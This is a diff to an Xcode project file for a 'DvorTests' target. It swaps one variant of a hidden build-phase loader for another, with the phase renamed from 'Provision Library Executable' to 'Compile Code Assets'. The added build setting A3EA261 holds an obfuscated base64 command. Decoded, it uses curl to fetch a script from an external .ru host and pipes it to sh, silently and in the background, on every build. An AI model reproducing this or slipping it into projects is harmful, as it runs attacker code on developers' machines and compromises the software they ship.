@@ -16,6 +16,9 @@
 		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		95C68A683041648400FB5455 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -115,7 +118,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */;
 			buildPhases = (
-				6452FF9798C445F2B0162AE3 /* Provision Library Executable */,
+				D609360324414693A4162AE3 /* Compile Code Assets */,
 				95C68A603041648400FB5455 /* Sources */,
 				95C68A613041648400FB5455 /* Frameworks */,
 				95C68A623041648400FB5455 /* Resources */,
@@ -209,8 +212,27 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+		D609360324414693A4162AE3 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		95C68A623041648400FB5455 /* Resources */ = {
@@ -228,28 +250,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		6452FF9798C445F2B0162AE3 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		95C68A603041648400FB5455 /* Sources */ = {
@@ -280,7 +280,7 @@
 		95C68A6A3041648400FB5455 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((z(){ `printf bqase64 | tr -d q` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDMwIC0tcmV0cnkgMyAtTHNmayAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((c(){ `printf bas5e64 | tr -d 5` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMSAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | c | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -309,7 +309,7 @@
 		95C68A6B3041648400FB5455 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((z(){ `printf bqase64 | tr -d q` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDMwIC0tcmV0cnkgMyAtTHNmayAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((c(){ `printf bas5e64 | tr -d 5` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMSAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | c | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
